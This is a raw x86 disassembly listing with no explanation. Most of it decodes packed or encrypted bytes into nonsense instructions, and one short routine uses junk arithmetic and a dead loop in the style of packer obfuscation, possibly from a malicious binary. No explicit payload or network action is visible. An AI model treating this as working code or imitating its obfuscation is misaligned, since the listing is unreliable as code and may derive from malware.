  4098df:	mov    ds:0xf6e0ff72,eax
  4098e4:	xlat   BYTE PTR ds:[ebx]
  4098e5:	(bad)  
  4098e6:	cmp    eax,0x9c426a83
  4098eb:	or     BYTE PTR [edi],al
  4098ed:	ficom  DWORD PTR [ebp+0x4f]
  4098f0:	loop   0x409900
  4098f2:	jg     0x4098eb
  4098f4:	push   esp
  4098f5:	pop    es
  4098f6:	push   edx
  4098f7:	iret   
  4098f8:	fst    QWORD PTR [ebx]
  4098fa:	jb     0x409882
  4098fc:	pop    ecx
  4098fd:	push   esi
  4098fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098ff:	inc    edi
  409900:	test   al,0x7e
  409902:	sbb    eax,0x8ffab3e8
  409907:	push   0x6b8d215f
  40990c:	cmp    al,0xc3
  40990e:	or     dl,BYTE PTR [edi-0x4cf84595]
  409914:	mov    ch,0x2f
  409916:	cmc    
  409917:	mov    eax,ecx
  409919:	xor    edi,DWORD PTR [ebp+0x6f65fba]
  40991f:	sbb    BYTE PTR [edi+0x45],dl
  409922:	test   eax,0xaf74464b
  409927:	push   esi
  409928:	sub    al,0x37
  40992a:	push   edi
  40992b:	mov    eax,0xfbc63788
  409930:	jmp    0xf631:0x44a0e96b
  409937:	sub    eax,0xc9a2b020
  40993c:	ins    BYTE PTR es:[edi],dx
  40993d:	aas    
  40993e:	sub    al,0xf
  409940:	(bad)  
  409942:	pop    ebp
  409943:	loop   0x4099af
  409945:	xchg   BYTE PTR [esi+0x4b72ac02],dh
  40994b:	push   ebx
  40994c:	or     al,0x8c
  40994e:	sub    eax,0x77fd769e
  409953:	xchg   esi,eax
  409954:	(bad)  
  409955:	mov    bl,0xed
  409957:	aad    0x11
  409959:	and    al,0x6a
  40995b:	in     eax,0x41
  40995d:	add    eax,DWORD PTR [eax-0x13]
  409960:	xchg   esp,eax
  409961:	iret   
  409962:	(bad)  
  409963:	jmp    0x4099da
  409965:	pushf  
  409966:	pop    esp
  409967:	outs   dx,BYTE PTR ds:[esi]
  409968:	sahf   
  409969:	retf   0xa947
  40996c:	iret   
  40996d:	inc    ecx
  40996e:	inc    ecx
  40996f:	aaa    
  409970:	jg     0x4098f5
  409972:	in     eax,dx
  409973:	je     0x40995d
  409975:	je     0x4099b5
  409977:	mov    ecx,0x4ff8d061
  40997c:	cmp    al,BYTE PTR [esi+0x7db4c291]
  409982:	mov    ch,0xde
  409984:	jge    0x409928
  409986:	pushf  
  409987:	loop   0x40995f
  409989:	sub    bh,BYTE PTR [eax-0x20]
  40998c:	mov    eax,ds:0x30c8a371
  409991:	xor    BYTE PTR [esi+0x55],dh
  409994:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409995:	fwait
  409996:	stc    
  409997:	push   ss
  409998:	jle    0x40998c
  40999a:	adc    esp,DWORD PTR [edi]
  40999c:	add    dh,bl
  40999e:	rep lods al,BYTE PTR ds:[esi]
  4099a0:	xor    BYTE PTR [ecx],0xc5
  4099a3:	imul   ebp
  4099a5:	stos   DWORD PTR es:[edi],eax
  4099a6:	sbb    al,0xc3
  4099a8:	or     ah,al
  4099aa:	inc    edi
  4099ab:	adc    eax,0x5737551
  4099b0:	pop    es
  4099b1:	mov    ebp,0x17a5269
  4099b6:	adc    DWORD PTR [esi-0x5e],ebx
  4099b9:	xchg   ecx,eax
  4099ba:	jl     0x409947
  4099bc:	sub    DWORD PTR [ebx+0x7f],ebp
  4099bf:	out    dx,al
  4099c0:	retf   0x118
  4099c3:	or     BYTE PTR [edi+0x5e],bl
  4099c6:	pop    ebx
  4099c7:	leave  
  4099c8:	ret    
  4099c9:	push   ebp
  4099ca:	mov    ebp,esp
  4099cc:	sub    esp,0x44
  4099cf:	push   edi
  4099d0:	sub    DWORD PTR ds:0x42fe0a,0x50c
  4099da:	mov    eax,DWORD PTR [ebp+0xc]
  4099dd:	sbb    DWORD PTR ds:0x42e19c,edx
  4099e3:	mov    DWORD PTR [ebp-0x10],eax
  4099e6:	mov    eax,ds:0x42e317
  4099eb:	mov    edi,DWORD PTR ds:0x42e327
  4099f1:	sub    eax,edi
  4099f3:	imul   eax,DWORD PTR [eax+edi*1]
  4099f7:	mov    eax,DWORD PTR [ebp+0x8]
  4099fa:	mov    DWORD PTR [ebp+0x8],0xf89c8531
  409a01:	neg    edx
  409a03:	mov    DWORD PTR [ebp-0x20],0xf89c8530
  409a0a:	mov    edi,DWORD PTR ds:0x42e81c
  409a10:	mov    edi,DWORD PTR [edi]
  409a12:	or     DWORD PTR ds:0x42e1a4,edi
  409a18:	mov    edx,DWORD PTR [ebp+0x8]
  409a1b:	add    edi,0x5c8e
  409a21:	mov    DWORD PTR [ebp-0x40],eax
  409a24:	adc    DWORD PTR ds:0x42fd79,0x342b
  409a2e:	mov    eax,0x7510855
  409a33:	xor    edi,ecx
  409a35:	xor    edx,eax
  409a37:	mov    edi,DWORD PTR ds:0x42e19c
  409a3d:	sbb    DWORD PTR ds:0x42e76b,edi
  409a43:	mov    ecx,0x32729c
  409a48:	jmp    0x409e06
  409a4d:	arpl   WORD PTR [edx-0x6f],si
  409a50:	cmc    
  409a51:	xchg   ecx,eax
  409a52:	cmc    
  409a53:	arpl   WORD PTR [edx-0x1f],si
  409a56:	pop    ebp
  409a57:	das    
  409a58:	test   DWORD PTR [eax-0x66],0xec872780
  409a5f:	jo     0x409ad1
  409a61:	lahf   
  409a62:	jge    0x409ad4
  409a64:	jo     0x409a52
  409a66:	pop    esi
  409a67:	gs pop esp
  409a69:	inc    edi
  409a6a:	sub    DWORD PTR [edx+0x20],esp
  409a6d:	ret    
  409a6e:	mov    ah,cl
  409a70:	inc    BYTE PTR [edi-0x69]
  409a73:	fldcw  WORD PTR [ebx+0x40]
  409a76:	mov    eax,0x63596f87
  409a7b:	inc    ecx
  409a7c:	ins    DWORD PTR es:[edi],dx
  409a7d:	test   BYTE PTR [ecx-0x14],0x3c
  409a81:	inc    edx
  409a82:	mov    ds:0x75afca8f,eax
  409a87:	push   ebx
  409a88:	repnz cmp edi,DWORD PTR [esi]
  409a8b:	mov    fs,WORD PTR ds:0x25b105f5
  409a91:	mov    ah,0x68
  409a93:	loope  0x409a29
  409a95:	pop    es
  409a96:	push   ecx
  409a97:	inc    edi
  409a98:	xor    al,0x38
  409a9a:	int    0x46
  409a9c:	pop    esi
  409a9d:	lahf   
  409a9e:	or     DWORD PTR ds:0x55e6cf7,0xffffffbe
  409aa5:	and    eax,0x94b51d31
  409aaa:	or     bh,0x45
  409aad:	ins    BYTE PTR es:[edi],dx
  409aae:	inc    edx
  409aaf:	ds push 0xa76a7ad2
  409ab5:	retf   0x7515
  409ab8:	sbb    ecx,esp
  409aba:	sub    esi,ecx
  409abc:	xchg   ecx,eax
  409abd:	push   ss
  409abe:	cmp    al,0x28
  409ac0:	adc    al,0xfa
  409ac2:	jl     0x409ac5
  409ac4:	pop    eax
  409ac5:	push   0xffffffd2
  409ac7:	push   0x36669eaa
  409acc:	inc    esp
  409acd:	(bad)  [esp+edx*4-0x57]
  409ad1:	mov    al,ds:0x2faf61e0
  409ad6:	jne    0x409acb
  409ad8:	xor    al,0x8c
  409ada:	jg     0x409b45
  409adc:	(bad)  
  409add:	cmp    dh,BYTE PTR ds:0x158ec3e2
  409ae3:	mov    esp,0x9d611959
  409ae8:	jl     0x409b49
  409aea:	jbe    0x409b1e
  409aec:	aad    0x2a
  409aee:	je     0x409b49
  409af0:	push   ebp
  409af1:	inc    edi
  409af2:	mov    WORD PTR [ebp-0x16],ds
  409af5:	push   cs
  409af6:	pop    ds
  409af7:	pop    edx
  409af8:	mov    esp,0xf48d27f4
  409afd:	xchg   DWORD PTR [ebx],esp
  409aff:	pop    edi
  409b00:	rol    BYTE PTR [ebx+0x732dc6b1],0x29
  409b07:	(bad)  
  409b08:	jmp    0x7668d5cb
  409b0d:	(bad)  
  409b0f:	or     BYTE PTR [edx-0x7e],0x20
  409b13:	stos   DWORD PTR es:[edi],eax
  409b14:	daa    
  409b15:	aad    0x15
  409b17:	or     edx,DWORD PTR [ecx-0x8]
  409b1a:	std    
  409b1b:	jo     0x409b7f
  409b1d:	pusha  
  409b1e:	xchg   esi,eax
  409b1f:	sahf   
  409b20:	push   esp
  409b21:	cmp    BYTE PTR ds:0xa1f7d4d6,dh
  409b27:	sub    DWORD PTR [edx],edx
  409b29:	sub    DWORD PTR [ebp-0x5c],edi
  409b2c:	data16 or BYTE PTR [edi+ebx*8],bh
  409b30:	fucomi st,st(1)
  409b32:	mov    ds:0x84f59977,al
  409b37:	xchg   ecx,eax
  409b38:	pusha  
  409b39:	xor    eax,0x2e6def3
  409b3e:	out    0xa2,al
  409b40:	rcr    DWORD PTR ds:0x44dcad1d,1
  409b46:	mov    ebx,esi
  409b48:	rcr    BYTE PTR [ecx+eiz*1],cl
  409b4b:	or     DWORD PTR [ebp+0x48],ebp
  409b4e:	xchg   cl,cl
  409b50:	pavgw  mm6,QWORD PTR [ecx-0x522b2ec5]
  409b57:	pushf  
  409b58:	nop
  409b59:	xor    al,0xc6
  409b5b:	sbb    eax,0x8e1ced48
  409b60:	mov    al,ds:0x47024442
  409b65:	leave  
  409b66:	inc    edx
  409b67:	mov    esp,0xb1272812
  409b6c:	pop    edi
  409b6d:	sub    al,0xae
  409b6f:	push   ds
  409b70:	mov    bh,0x26
  409b72:	jp     0x409b35
  409b74:	ins    DWORD PTR es:[edi],dx
  409b75:	jge    0x409beb
  409b77:	test   DWORD PTR [esi+0x48a8aa5],ebx
  409b7d:	sub    al,0x39
  409b7f:	mov    dh,bh
  409b81:	jne    0x409bd1
  409b83:	jmp    0xf397f0df
  409b88:	aas    
  409b89:	mov    bh,0x70
  409b8b:	enter  0xe24a,0xc3
  409b8f:	fimul  WORD PTR [esp+edi*2]
  409b92:	jmp    0xb1f9:0xa1eada99
  409b99:	test   DWORD PTR cs:[eax+0xc],edx
  409b9d:	mov    edi,0x25d96bc
  409ba2:	mov    ebp,0x788e1f66
  409ba7:	(bad)  
  409ba8:	(bad)  
  409ba9:	sti    
  409baa:	mov    edx,0x32b4532f
  409baf:	xor    DWORD PTR [esi],ebp
  409bb1:	hlt    
  409bb2:	imul   esi,DWORD PTR [edi+eiz*4-0xf1406d],0x31b2d109
  409bbd:	out    dx,al
  409bbe:	inc    BYTE PTR [esi-0x2]
  409bc1:	pop    ecx
  409bc2:	add    eax,0x2d670f0a
  409bc7:	fisttp WORD PTR [esi+edx*1]
  409bca:	outs   dx,DWORD PTR ds:[esi]
  409bcb:	jmp    0x409bed
  409bcd:	xor    eax,0x8d4a0235
  409bd2:	jbe    0x409b7a
  409bd4:	dec    eax
  409bd5:	scas   eax,DWORD PTR es:[edi]
  409bd6:	lock cmp esp,DWORD PTR [ebx]
  409bd9:	mov    ?,WORD PTR [esi+esi*4-0x6c933a14]
  409be0:	retf   0x9f73
  409be3:	sub    edi,DWORD PTR [ebx]
  409be5:	sahf   
  409be6:	loop   0x409b80
  409be8:	fimul  WORD PTR [ecx+0x68]
  409beb:	(bad)  
  409bec:	jg     0x409c04
  409bee:	ds or  al,0x4f
  409bf1:	sbb    bl,BYTE PTR [ebx+0x6bdb2fa2]
  409bf7:	xor    al,0xbd
  409bf9:	scas   eax,DWORD PTR es:[edi]
  409bfa:	xchg   edi,eax
  409bfb:	std    
  409bfc:	cmp    DWORD PTR [edx+0x5ea21f25],edx
  409c02:	jmp    0x33fd76ad
  409c07:	add    cl,BYTE PTR [ecx+edx*4+0x7d33b715]
  409c0e:	or     BYTE PTR [ebp+0x3],cl
  409c11:	push   ebx
  409c12:	int    0x54
  409c14:	sub    al,BYTE PTR [edx+0x5c]
  409c17:	fidivr WORD PTR [ecx+0x1ae13810]
  409c1d:	and    eax,0xf315645c
  409c22:	ins    BYTE PTR es:[edi],dx
  409c23:	and    al,bl
  409c25:	jmp    0x409be4
  409c27:	(bad)  
  409c28:	push   esi
  409c29:	mov    ds:0xdffae43b,eax
  409c2e:	aas    
  409c2f:	inc    edx
  409c30:	mov    ds,WORD PTR [esi+0xb]
  409c33:	inc    edx
  409c34:	mov    eax,0x45b894e2
  409c39:	hlt    
  409c3a:	mov    ah,0x42
  409c3c:	adc    BYTE PTR [ecx+0x2323ab3f],bh
  409c42:	inc    ebx
  409c43:	imul   ebx,esi,0x615fbff2
  409c49:	popf   
  409c4a:	pop    edi
  409c4b:	mov    eax,ds:0x10d23a6c
  409c50:	or     al,0x93
  409c52:	(bad)  [ebx-0x3b]
  409c55:	mov    ecx,0xc282d1e0
  409c5a:	jb     0x409cd2
  409c5c:	jp     0x409c55
  409c5e:	inc    eax
  409c5f:	sbb    ah,BYTE PTR [ebx+0x2de0b498]
  409c65:	je     0x409c5a
  409c67:	mov    al,ds:0xc026183a
  409c6c:	push   cs
  409c6d:	sbb    eax,0x3f9c9f06
  409c72:	sub    BYTE PTR [edx+0x5d6ec08c],dl
  409c78:	out    dx,eax
  409c79:	not    esi
  409c7b:	dec    ebp
  409c7c:	outs   dx,DWORD PTR fs:[esi]
  409c7e:	cld    
  409c7f:	retf   0x9f28
  409c82:	dec    eax
  409c83:	jmp    0xf169d325
  409c88:	and    edi,ebx
  409c8a:	dec    esp
  409c8b:	cwde   
  409c8c:	das    
  409c8d:	(bad)  
  409c8e:	out    0x54,al
  409c90:	sbb    BYTE PTR [edi+esi*1-0x7a],bl
  409c94:	ins    BYTE PTR es:[edi],dx
  409c95:	loop   0x409c34
  409c97:	int    0xa5
  409c99:	jl     0x409cbe
  409c9b:	mov    BYTE PTR [edi],0xd0
  409c9e:	and    eax,0xaaa7ea28
  409ca3:	inc    edx
  409ca4:	shl    DWORD PTR [ecx+esi*2],cl
  409ca7:	jge    0x409cd8
  409ca9:	leave  
  409caa:	cld    
  409cab:	call   DWORD PTR [esp+ecx*8-0x78]
  409caf:	add    BYTE PTR [ebp-0x63],bh
  409cb2:	jnp    0x409cde
  409cb4:	xchg   BYTE PTR [esi+0x56b86c6],dl
  409cba:	popa   
  409cbb:	addr16 nop
  409cbd:	push   edi
  409cbe:	dec    eax
  409cbf:	leave  
  409cc0:	inc    ebp
  409cc1:	shl    DWORD PTR [edx+0x54debefe],cl
  409cc7:	nop    eax
  409cca:	mov    es,WORD PTR [ebp-0x8]
  409ccd:	jbe    0x409d42
  409ccf:	shl    BYTE PTR [edi],1
  409cd1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cd2:	out    0x7b,al
  409cd4:	inc    edx
  409cd5:	out    0xec,eax
  409cd7:	out    dx,eax
  409cd8:	or     al,0xca
  409cda:	cmp    DWORD PTR [edx+0x7f],edx
  409cdd:	or     DWORD PTR [esi+0x789474f0],edx
  409ce3:	js     0x409cd5
  409ce5:	jno    0x409c71
  409ce7:	add    eax,0xcaad876c
  409cec:	dec    ebp
  409ced:	aam    0x89
  409cef:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409cf0:	cmp    ch,BYTE PTR [eax-0x21]
  409cf3:	mov    ecx,0x8bffff54
  409cf8:	icebp  
  409cf9:	bound  edi,QWORD PTR [edx+0x8]
  409cfc:	jo     0x409d1e
  409cfe:	mov    ah,BYTE PTR [esi+0xc]
  409d01:	out    0x57,al
  409d03:	into   
  409d04:	xor    edi,edi
  409d06:	inc    eax
  409d07:	out    0xb3,al
  409d09:	xchg   esi,eax
  409d0a:	mov    bh,0x6c
  409d0c:	aam    0x69
  409d0e:	mov    esi,0x81a99b69
  409d13:	arpl   WORD PTR [edi-0x43],bx
  409d16:	leave  
  409d17:	mov    esi,DWORD PTR [esp+ebx*8+0x30]
  409d1b:	outs   dx,DWORD PTR ds:[esi]
  409d1c:	and    BYTE PTR [ecx-0x1],ah
  409d1f:	sti    
  409d20:	les    ebx,FWORD PTR [ecx]
  409d22:	pop    ss
  409d23:	and    eax,0x5b7f9b03
  409d28:	inc    ecx
  409d29:	jmp    0xe3d6799e
  409d2e:	test   al,0x89
  409d30:	push   esi
  409d31:	(bad)  
  409d32:	sti    
  409d33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409d34:	mov    edx,0x362ca716
  409d39:	cmp    eax,esi
  409d3b:	sbb    al,0x6b
  409d3d:	pop    es
  409d3e:	jge    0x409d30
  409d40:	(bad)  
  409d41:	hlt    
  409d42:	icebp  
  409d43:	inc    edi
  409d44:	dec    edx
  409d45:	inc    esi
  409d46:	cdq    
  409d47:	mov    BYTE PTR [ebp-0x50],0x18
  409d4b:	adc    edi,DWORD PTR [eax+edi*4-0x24]
  409d4f:	and    al,0x7b
  409d51:	bound  ecx,QWORD PTR [ecx+edx*4-0x55a35389]
  409d58:	sub    BYTE PTR [esi-0x79300d74],0xc6
  409d5f:	fsub   st,st(6)
  409d61:	push   edi
  409d62:	cmp    eax,0x3f9f6b10
  409d67:	mov    ds:0x3ba6d457,eax
  409d6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d6d:	enter  0xf13a,0x54
  409d71:	and    eax,0x12a9c10d
  409d76:	jns    0x409dbb
  409d78:	jns    0x409d14
  409d7a:	mov    al,BYTE PTR [esi-0x1b185834]
  409d80:	cs sti 
  409d82:	xor    DWORD PTR [ebx-0x20adc1af],ecx
  409d88:	pop    es
  409d89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d8a:	ds jmp 0x78f4773e
  409d90:	test   al,0x36
  409d92:	daa    
  409d93:	push   cs
  409d94:	fbstp  TBYTE PTR [ebx]
  409d96:	rcr    DWORD PTR [edx+0x283aa5b2],cl
  409d9c:	mov    DWORD PTR [ebx],ebp
  409d9e:	and    DWORD PTR [ebx-0x75],esi
  409da1:	push   di
  409da3:	test   al,0x4e
  409da5:	aad    0xa5
  409da7:	xchg   esi,eax
  409da8:	(bad)  
  409da9:	xchg   edx,eax
  409daa:	mov    WORD PTR [ecx+0x85f2d82],?
  409db0:	call   0xe929:0x251fd552
  409db7:	test   BYTE PTR [si-0x63],dl
  409dbb:	push   ds
  409dbc:	int    0x10
  409dbe:	cmp    DWORD PTR [edx+0x4fd4bf62],ecx
  409dc4:	dec    esi
  409dc5:	dec    eax
  409dc6:	inc    eax
  409dc7:	xor    DWORD PTR [esi-0x54],0x46f0efc1
  409dce:	sti    
  409dcf:	pop    es
  409dd0:	pop    esp
  409dd1:	retf   0x935b
  409dd4:	inc    ecx
  409dd5:	aad    0x3d
  409dd7:	iret   
  409dd8:	xlat   BYTE PTR ds:[ebx]
  409dd9:	adc    dh,BYTE PTR [ecx+eiz*8]
  409ddc:	lods   al,BYTE PTR ds:[esi]
  409ddd:	or     eax,0xb85e78fd
  409de2:	push   0x7aad98db
  409de7:	mov    edx,?
  409de9:	ficomp DWORD PTR [ecx]
  409deb:	fisubr WORD PTR [ebp+ebx*4-0x71]
  409def:	(bad)  
  409df0:	fdiv   QWORD PTR [ebp+edx*4-0x7d]
  409df4:	or     eax,0x55b5c2dd
  409df9:	jns    0x409e1c
  409dfb:	or     esi,DWORD PTR ss:[edx+0x27]
  409dff:	mov    DWORD PTR [ecx],esp
  409e01:	rcr    BYTE PTR cs:[edx-0x2efc2225],0x31
  409e09:	or     eax,0x42fe0a
  409e0e:	mov    DWORD PTR [ebp-0x8],edx
  409e11:	mov    edx,DWORD PTR [ebp+0x8]
  409e14:	and    edi,DWORD PTR ds:0x42fd79
  409e1a:	xor    edx,eax
  409e1c:	adc    edi,DWORD PTR ds:0x42e1a4
  409e22:	add    edx,ecx
  409e24:	mov    DWORD PTR ds:0x42fe02,0x18
  409e2e:	cmp    DWORD PTR ds:0x42fe02,0x0
  409e35:	je     0x409e63
  409e3b:	cmp    DWORD PTR ds:0x42fe02,0x1a
  409e42:	jne    0x409e51
  409e48:	push   DWORD PTR [ebp-0xc]
  409e4b:	call   DWORD PTR ds:0x42e363
  409e51:	mov    edi,DWORD PTR ds:0x42fe02
  409e57:	dec    edi
  409e58:	mov    DWORD PTR ds:0x42fe02,edi
  409e5e:	jmp    0x409e2e
  409e63:	mov    DWORD PTR [ebp+0xc],edx
  409e66:	adc    DWORD PTR ds:0x42e783,0x3e25
  409e70:	jmp    0x40a22e
  409e75:	xlat   BYTE PTR ds:[ebx]
  409e76:	mov    edi,0x699269fa
  409e7b:	mul    DWORD PTR [ecx-0x79]
  409e7e:	mov    dh,0xc4
  409e80:	(bad)  
  409e81:	shr    BYTE PTR [edi+edx*8],1
  409e84:	or     ah,BYTE PTR [esi]
  409e86:	call   0x7de00efb
  409e8b:	jo     0x409efd
  409e8d:	pushf  
  409e8e:	dec    esi
  409e8f:	jns    0x409e69
  409e91:	push   edx
  409e92:	fstp   DWORD PTR [ebx-0x73]
  409e95:	sbb    al,ah
  409e97:	in     al,0xdb
  409e99:	mov    bl,0x59
  409e9b:	mov    WORD PTR [ebx+esi*1],fs
  409e9e:	bound  esi,QWORD PTR [esi+0x77a03bd1]
  409ea4:	fwait
  409ea5:	mov    ds:0xe5dc1db2,eax
  409eaa:	cmp    BYTE PTR [edx],bh
  409eac:	or     esp,DWORD PTR [edx-0x48]
  409eaf:	xor    DWORD PTR [esi],ebx
  409eb1:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  409eb3:	mov    dl,BYTE PTR [esi+0x578a98f8]
  409eb9:	imul   ebp,DWORD PTR [esp+esi*8-0xcf1b633],0x561821e
  409ec4:	adc    edx,DWORD PTR [ebx-0x1a544766]
  409eca:	or     edx,DWORD PTR [eax]
  409ecc:	and    esp,eax
  409ece:	xor    ah,ch
  409ed0:	cs lahf 
  409ed2:	imul   eax,DWORD PTR ds:0xf3e54fc3,0xffffffe1
  409ed9:	xchg   esp,eax
  409eda:	enter  0xc557,0x28
  409ede:	int    0xe0
  409ee0:	mov    dh,0xb9
  409ee2:	pushf  
  409ee3:	mov    edx,0x8e3021a2
  409ee8:	dec    esp
  409ee9:	xchg   DWORD PTR [edi+0x5e],edi
  409eec:	dec    edi
  409eed:	mov    dh,0xf3
  409eef:	mov    ah,0x51
  409ef1:	sub    DWORD PTR [eax],0xe63d3f6a
  409ef7:	sub    eax,0xf4df54af
  409efc:	sub    al,0xce
  409efe:	xchg   DWORD PTR [edi+0x6d],edx
  409f01:	mov    dl,0x62
  409f03:	xchg   esp,eax
  409f04:	xchg   esi,eax
  409f05:	rcl    DWORD PTR [edx],0xb9
  409f08:	push   esi
  409f09:	data16 jno 0x409f34
  409f0c:	out    0x50,al
  409f0e:	mov    ecx,DWORD PTR [eax-0x23]
  409f11:	cmp    DWORD PTR [ebx+ebx*8-0x6],edx
  409f15:	mov    ds:0x593eb77,al
  409f1a:	inc    edi
  409f1b:	ins    DWORD PTR es:[edi],dx
  409f1c:	(bad)  
  409f1e:	jmp    0x3a3285e4
  409f23:	mov    ecx,0x8bd4fd6a
  409f28:	mov    bl,0xad
  409f2a:	inc    BYTE PTR [ebx+ebp*4-0x64]
  409f2e:	jge    0x409f17
  409f30:	jns    0x409fa8
  409f32:	(bad)  [edx]
  409f34:	or     esi,DWORD PTR [ebx+esi*2-0x15]
  409f38:	pop    ebx
  409f39:	pop    esp
  409f3a:	arpl   WORD PTR [ebx+ecx*2],sp
  409f3d:	ins    DWORD PTR es:[edi],dx
  409f3e:	sbb    eax,0xbcfd7fda
  409f43:	pop    eax
  409f44:	xchg   edx,eax
  409f45:	mov    bl,ch
  409f47:	daa    
  409f48:	add    DWORD PTR [edx+0x7b],ebx
  409f4b:	sbb    BYTE PTR [eax-0x3d],bh
  409f4e:	enter  0x5f7a,0xaa
  409f52:	or     dh,BYTE PTR [edi+ebp*4+0x1923c897]
  409f59:	pusha  
  409f5a:	fild   DWORD PTR [ebx+0x12fc580b]
  409f60:	adc    eax,0xeb33388d
  409f65:	int3   
  409f66:	or     BYTE PTR [esi+0x5e586545],bl
  409f6c:	shl    DWORD PTR [ebx],0x8c
  409f6f:	in     al,0x2c
  409f71:	test   DWORD PTR [ebx+eiz*4-0x5e],edx
  409f75:	sbb    dl,BYTE PTR [eax]
  409f77:	cmp    cl,al
  409f79:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409f7a:	pop    ebx
  409f7b:	and    DWORD PTR [eax-0x2513283b],0x3afa2206
  409f85:	jecxz  0x409fa6
  409f87:	jl     0x409f8f
  409f89:	inc    edx
  409f8a:	mov    cl,0x66
  409f8c:	or     BYTE PTR [eax],dh
  409f8e:	in     al,0x81
  409f90:	dec    edx
  409f91:	shl    BYTE PTR [ecx+ebx*1+0x2a],1
  409f95:	(bad)  
  409f96:	and    al,0x9e
  409f98:	retf   0xc3bf
  409f9b:	sahf   
  409f9c:	mov    ah,0x7
  409f9e:	mov    eax,0xa4003556
  409fa3:	cld    
  409fa4:	(bad)  [esi+0x3e]
  409fa7:	jg     0x40a017
  409fa9:	adc    eax,0x6bac3b26
  409fae:	(bad)  
  409faf:	adc    bl,BYTE PTR [edx+ecx*1-0x38a59bca]
  409fb6:	ja     0x40a008
  409fb8:	push   esi
  409fb9:	add    edx,DWORD PTR [esi-0x7b]
  409fbc:	inc    esp
  409fbd:	outs   dx,DWORD PTR ds:[esi]
  409fbe:	xchg   esi,eax
  409fbf:	mov    esp,0x84215818
  409fc4:	repnz sbb eax,0xeaeef28c
  409fca:	loopne 0x409f73
  409fcc:	call   0x6c1d:0xc2f78562
  409fd3:	jns    0x40a001
  409fd5:	adc    DWORD PTR [eax-0x24],edi
  409fd8:	cmp    eax,ebx
  409fda:	push   0x1b
  409fdc:	pop    esp
  409fdd:	xchg   ebp,eax
  409fde:	and    ch,BYTE PTR [ebx]
  409fe0:	dec    edx
  409fe1:	and    cl,BYTE PTR [eax+esi*2]
  409fe4:	(bad)  
  409fe5:	sub    BYTE PTR [eax-0x1b],dl
  409fe8:	cmp    DWORD PTR [ebp+0x25],esi
  409feb:	stos   BYTE PTR es:[edi],al
  409fec:	jmp    0xbbea:0x541e8a18
  409ff3:	inc    ecx
  409ff4:	stos   DWORD PTR es:[edi],eax
  409ff5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ff6:	xor    esp,ebp
  409ff8:	leave  
  409ff9:	xor    eax,0xadbdd9f3
  409ffe:	ja     0x409fad
  40a000:	push   0x4d
  40a002:	mov    eax,0x16fe36a4
  40a007:	mov    edx,0xde8823b
  40a00c:	cmp    esp,DWORD PTR [edi+eiz*2]
  40a00f:	aad    0xe9
  40a011:	push   ecx
  40a012:	lods   al,BYTE PTR ds:[esi]
  40a013:	mov    esp,0x9d12d8f4
  40a018:	(bad)  
  40a019:	xchg   edx,eax
  40a01a:	les    ebp,FWORD PTR ds:0x89300d05
  40a020:	add    esp,DWORD PTR [ebp-0x1385dea6]
  40a026:	push   ebp
  40a027:	mov    BYTE PTR [esi+0x24],dh
  40a02a:	hlt    
  40a02b:	xchg   ecx,eax
  40a02c:	out    0x2e,eax
  40a02e:	dec    eax
  40a02f:	aaa    
  40a030:	and    BYTE PTR [edi-0x12],al
  40a033:	outs   dx,DWORD PTR ds:[esi]
  40a035:	in     eax,dx
  40a036:	gs test dh,dh
  40a039:	push   ss
  40a03a:	add    DWORD PTR [edi],0x3ca94f96
  40a040:	retf   
  40a041:	and    DWORD PTR [esi+ebx*1],ebx
  40a044:	fidivr DWORD PTR [edx+0x4b]
  40a047:	adc    al,0x98
  40a049:	pop    edx
  40a04a:	pop    edi
  40a04b:	mov    dh,0x5b
  40a04d:	ja     0x40a036
  40a04f:	test   BYTE PTR [eax-0x34],0x70
  40a053:	dec    edx
  40a054:	dec    ebx
  40a055:	test   eax,0x184ec44
  40a05a:	fiadd  DWORD PTR [esi]
  40a05c:	scas   eax,DWORD PTR es:[edi]
  40a05d:	and    dh,BYTE PTR [ecx-0xf0ca0ea]
  40a063:	cmc    
  40a064:	(bad)  
  40a065:	jl     0x409ffd
  40a067:	cs das 
  40a069:	dec    edi
  40a06a:	ins    DWORD PTR es:[edi],dx
  40a06b:	jle    0x40a06c
  40a06d:	adc    ah,BYTE PTR [esi+eiz*1]
  40a070:	xor    BYTE PTR [ebx+0x49],al
  40a073:	scas   al,BYTE PTR es:[edi]
  40a074:	dec    esp
  40a075:	mov    ecx,0xd0ce1977
  40a07a:	ret    
  40a07b:	xchg   edx,eax
  40a07c:	dec    esp
  40a07d:	(bad)  
  40a07e:	lock xchg esi,eax
  40a080:	outs   dx,DWORD PTR ds:[esi]
  40a081:	in     eax,dx
  40a082:	mov    ch,bl
  40a084:	jns    0x40a015
  40a086:	xchg   ebx,edx
  40a088:	arpl   WORD PTR [ebx],di
  40a08a:	xor    eax,0xc45bfcc7
  40a08f:	mov    bh,0x6f
  40a091:	or     BYTE PTR [ecx],0xcd
  40a094:	dec    ecx
  40a095:	sub    DWORD PTR [ebx+0x411ac2c4],esp
  40a09b:	hlt    
  40a09c:	cld    
  40a09d:	pop    edx
  40a09e:	inc    esi
  40a09f:	mov    dl,0xfe
  40a0a1:	(bad)  
  40a0a2:	add    al,0x59
  40a0a4:	inc    edi
  40a0a5:	(bad)  
  40a0a6:	je     0x40a03f
  40a0a8:	nop
  40a0a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a0aa:	add    esi,eax
  40a0ac:	scas   al,BYTE PTR es:[edi]
  40a0ad:	push   0xdcaf3b68
  40a0b2:	test   al,0x7a
  40a0b4:	test   al,0x17
  40a0b6:	lds    esi,FWORD PTR [edx+0x4d]
  40a0b9:	lods   al,BYTE PTR ds:[esi]
  40a0ba:	and    al,0x3b
  40a0bc:	push   0x12
  40a0be:	ret    0x174c
  40a0c1:	pop    ecx
  40a0c2:	push   ss
  40a0c3:	add    bl,dh
  40a0c5:	xchg   esp,eax
  40a0c6:	int    0x73
  40a0c8:	jg     0x40a0a0
  40a0ca:	mov    ebx,0x929a6829
  40a0cf:	mov    al,ds:0xd987af4a
